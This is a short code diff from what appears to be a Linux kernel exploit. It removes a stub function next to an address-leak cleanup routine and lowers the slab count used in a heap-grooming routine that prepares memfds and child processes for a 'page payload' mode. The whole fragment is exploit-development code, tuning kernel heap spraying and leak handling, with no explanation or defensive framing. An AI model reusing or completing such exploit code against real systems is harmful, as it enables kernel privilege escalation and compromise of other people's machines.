@@ -65,12 +65,6 @@ uintptr_t cleanup_kernelsnitch(void) {
   return leaked;
 }
 
-__attribute__((weak))
-int install_embedded_wallpaper(void) {
-  errno = ENOSYS;
-  return 0;
-}
-
 void read_first_line(const char *path, char *buf, size_t len) {
   if (!len) {
     return;
@@ -462,7 +456,7 @@ int clone_memfd(void) {
 }
 
 void prepare_ctxs(int payload_mode) {
-  int prepare_slabs = payload_mode == PAGE_PAYLOAD_SLIDE ? 8 : 12;
+  int prepare_slabs = payload_mode == PAGE_PAYLOAD_SLIDE ? 8 : 8;
   prepare_ctx.mm_cnt = prepare_slabs * mm_objs_per_slab;
   prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
   prepare_ctx.memfds = calloc(sizeof(int), prepare_ctx.mm_cnt);
